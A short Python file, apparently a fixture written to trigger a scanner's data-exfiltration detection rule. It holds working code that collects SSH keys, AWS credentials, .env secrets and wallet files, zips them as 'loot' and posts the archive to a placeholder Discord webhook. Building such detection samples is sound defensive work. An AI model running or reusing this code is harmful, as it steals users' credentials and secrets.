"""Fixture: Data exfiltration – must trigger Data_Exfiltration_Python rule."""
import os
import glob
import zipfile
import requests

WEBHOOK = "https://discord.com/api/webhooks/123456/ABCDEF"

sensitive_dirs = [
    os.path.expanduser("~/.ssh"),
    os.path.expanduser("~/.aws"),
    os.path.expanduser("~/.env"),
]

targets = []
for path in sensitive_dirs:
    targets += glob.glob(os.path.join(path, "**"), recursive=True)
    targets += glob.glob(os.path.join(path, "credentials"), recursive=True)
    targets += glob.glob(os.path.join(path, "id_rsa"), recursive=True)
    targets += glob.glob(os.path.join(path, "wallet"), recursive=True)

archive_path = "/tmp/loot.zip"
with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
    for f in targets:
        if os.path.isfile(f):
            zf.write(f)

with open(archive_path, "rb") as fh:
    requests.post(WEBHOOK, files={"file": fh})
